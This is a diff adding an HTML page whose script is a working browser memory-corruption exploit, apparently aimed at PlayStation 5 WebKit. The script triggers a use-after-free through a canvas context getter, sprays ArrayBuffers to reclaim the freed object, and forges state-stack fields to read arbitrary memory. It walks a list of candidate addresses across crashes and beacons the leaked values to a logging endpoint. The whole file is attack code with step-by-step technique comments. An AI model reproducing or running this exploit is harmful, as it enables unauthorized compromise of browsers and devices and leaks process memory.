@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V650</title></head>
+<body><pre id="out">V650 — forged stateStack address scanner</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V650-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+/*
+ * TECHNIQUE: Forged stateStack m_buffer read
+ *
+ * 1. UAF → free 768B context (Sony zeroes it)
+ * 2. AB(768) spray → one AB reclaims the freed slot
+ * 3. Write TARGET_ADDR to m_stateStack.m_buffer at AB offset +112
+ * 4. Write m_size=1 at AB offset +124
+ * 5. Read lineWidth → reads 8 bytes at TARGET_ADDR + 48
+ * 6. Null out innerCtx before any allocation → GC-safe
+ * 7. Clear forged data → GC-safe
+ * 8. Beacon result
+ *
+ * If TARGET_ADDR is unmapped → SIGSEGV → process respawn → next attempt
+ * localStorage tracks attempt number across crashes
+ */
+
+/* Target addresses: hi32, lo32 (little-endian pair) */
+/* Each target: [hi, lo, description] */
+var TARGETS = [
+  /* Phase 1: FreeBSD default stack area (no ASLR on BSD 11) */
+  [0x00007FFF, 0xFFFFC000, 'stack-8k'],
+  [0x00007FFF, 0xFFFF8000, 'stack-32k'],
+  [0x00007FFF, 0xFFFF0000, 'stack-64k'],
+  [0x00007FFF, 0xFFFE0000, 'stack-128k'],
+  [0x00007FFF, 0xFFFC0000, 'stack-256k'],
+  [0x00007FFF, 0xFFF80000, 'stack-512k'],
+
+  /* Phase 2: Orbis OS typical module base (PS5 specific) */
+  [0x00000000, 0x00400000, 'exe-400k'],
+  [0x00000000, 0x00800000, 'exe-800k'],
+  [0x00000000, 0x01000000, 'exe-16M'],
+  [0x00000000, 0x04000000, 'exe-64M'],
+  [0x00000000, 0x10000000, 'exe-256M'],
+  [0x00000000, 0x80000000, 'exe-2G'],
+
+  /* Phase 3: PIE binary base (FreeBSD amd64 default) */
+  [0x00000002, 0x00000000, 'pie-8G'],
+  [0x00000002, 0x00200000, 'pie-8G+2M'],
+  [0x00000002, 0x00400000, 'pie-8G+4M'],
+  [0x00000002, 0x01000000, 'pie-8G+16M'],
+
+  /* Phase 4: Library loading area */
+  [0x00000008, 0x00000000, 'lib-32G'],
+  [0x00000008, 0x00200000, 'lib-32G+2M'],
+  [0x00000008, 0x00400000, 'lib-32G+4M'],
+  [0x00000008, 0x01000000, 'lib-32G+16M'],
+
+  /* Phase 5: Broad mmap scan */
+  [0x00000001, 0x00000000, 'mmap-4G'],
+  [0x00000003, 0x00000000, 'mmap-12G'],
+  [0x00000004, 0x00000000, 'mmap-16G'],
+  [0x00000005, 0x00000000, 'mmap-20G'],
+  [0x00000006, 0x00000000, 'mmap-24G'],
+  [0x00000007, 0x00000000, 'mmap-28G'],
+
+  /* Phase 6: PS5 specific - known from firmware research */
+  [0x00000000, 0x20000000, 'ps5-512M'],
+  [0x00000000, 0x40000000, 'ps5-1G'],
+  [0x00000000, 0x60000000, 'ps5-1.5G'],
+  [0x00000000, 0xC0000000, 'ps5-3G'],
+];
+
+var MAX_ATTEMPTS = TARGETS.length;
+var attempt = 0;
+try { attempt = parseInt(localStorage.getItem('v650_attempt')) || 0; } catch(e) {}
+
+bk('BOOT', 'attempt='+attempt+'/'+MAX_ATTEMPTS);
+say('Attempt ' + attempt + '/' + MAX_ATTEMPTS);
+
+if (attempt < 0) {
+  /* Previous success — show it */
+  var prev = 'done';
+  try { prev = localStorage.getItem('v650_result') || 'done'; } catch(e) {}
+  bk('PREV-HIT', prev);
+  say('Previous hit: ' + prev);
+} else if (attempt >= MAX_ATTEMPTS) {
+  bk('EXHAUSTED', 'all-'+MAX_ATTEMPTS+'-crashed');
+  say('All targets exhausted — no mapped address found');
+} else {
+  var tgt = TARGETS[attempt];
+  var tgtHi = tgt[0], tgtLo = tgt[1], tgtDesc = tgt[2];
+  var tgtHex = '0x'+('00000000'+tgtHi.toString(16)).slice(-8)+('00000000'+tgtLo.toString(16)).slice(-8);
+  bk('TGT', 'n='+attempt+'|addr='+tgtHex+'|'+tgtDesc);
+  say('Target: ' + tgtHex + ' (' + tgtDesc + ')');
+
+  /* Pre-increment attempt counter for next load after crash */
+  try { localStorage.setItem('v650_attempt', String(attempt + 1)); } catch(e) {}
+
+  /* === UAF TRIGGER === */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var getterRan = false;
+
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    getterRan = true;
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+
+  var bmrCtx = canvas.getContext('bitmaprenderer', uafOpts);
+  bk('UAF', 'bmr='+(bmrCtx?'OK':'NULL')+',getter='+getterRan+',inner='+(innerCtx?'OK':'NULL'));
+
+  if (!innerCtx) {
+    bk('FAIL', 'no-inner');
+    say('UAF failed');
+  } else {
+    /* === FLUSH DEALLOC LOG === */
+    for (var f = 0; f < 600; f++) {
+      var tmp = new ArrayBuffer(16);
+    }
+
+    /* === AB(768) SPRAY === */
+    var SPRAY_N = 200;
+    var abs = [];
+    var dvs = [];
+    for (var s = 0; s < SPRAY_N; s++) {
+      var ab = new ArrayBuffer(768);
+      abs.push(ab);
+      dvs.push(new DataView(ab));
+    }
+    bk('SPRAY', 'n='+SPRAY_N);
+
+    /* === FORGE m_stateStack IN ALL ABs === */
+    /* NO allocations from here until after lineWidth read! */
+    for (var w = 0; w < dvs.length; w++) {
+      var dv = dvs[w];
+      /* m_stateStack.m_buffer at offset +112 (8 bytes, little-endian) */
+      dv.setUint32(112, tgtLo, true);
+      dv.setUint32(116, tgtHi, true);
+      /* m_stateStack.m_capacity at offset +120 */
+      dv.setUint32(120, 1, true);
+      /* m_stateStack.m_size at offset +124 */
+      dv.setUint32(124, 1, true);
+    }
+
+    /* === CRITICAL READ — may SIGSEGV if target unmapped === */
+    var leaked = innerCtx.lineWidth;
+
+    /* === IMMEDIATELY SAFE: null wrapper + clear forged data === */
+    innerCtx = null;
+    for (var c = 0; c < dvs.length; c++) {
+      dvs[c].setFloat64(112, 0, true);
+      dvs[c].setUint32(120, 0, true);
+      dvs[c].setUint32(124, 0, true);
+    }
+
+    /* === BEACON RESULT === */
+    var leakedHex = f2h(leaked);
+    _f64[0] = leaked;
+    var leakedBig = _bu[0].toString(16);
+
+    bk('HIT', 'addr='+tgtHex+'|lw='+leaked+'|hex='+leakedHex+'|big=0x'+leakedBig);
+    say('HIT! Target=' + tgtHex + ' lineWidth=' + leaked + ' hex=' + leakedHex + ' big=0x' + leakedBig);
+
+    /* Also read other fields at different offsets */
+    /* Re-forge for miterLimit read (offset +64 within State) */
+    /* Actually, innerCtx is null now. We can't read more fields. */
+    /* But the HIT means this address is mapped! */
+
+    /* Mark success */
+    try {
+      localStorage.setItem('v650_attempt', '-1');
+      localStorage.setItem('v650_result', 'addr='+tgtHex+'|lw='+leakedHex+'|big=0x'+leakedBig+'|n='+attempt);
+    } catch(e) {}
+
+    /* If value is 0, it's mapped but zeroed — try to scan nearby */
+    if (leaked === 0) {
+      bk('ZERO-HIT', 'mapped-but-zero|addr='+tgtHex);
+      say('Address mapped but value is zero — trying nearby offsets');
+
+      /* Re-create a fresh UAF for more reads */
+      /* Actually we already nulled innerCtx. Need a new UAF cycle. */
+      /* For now, just report the mapped address — next probe will scan within */
+    }
+
+    bk('DONE', 'attempt='+attempt+'|addr='+tgtHex+'|leaked='+leakedHex);
+    say('Done — scan complete');
+  }
+}
+</script>
+</body></html>
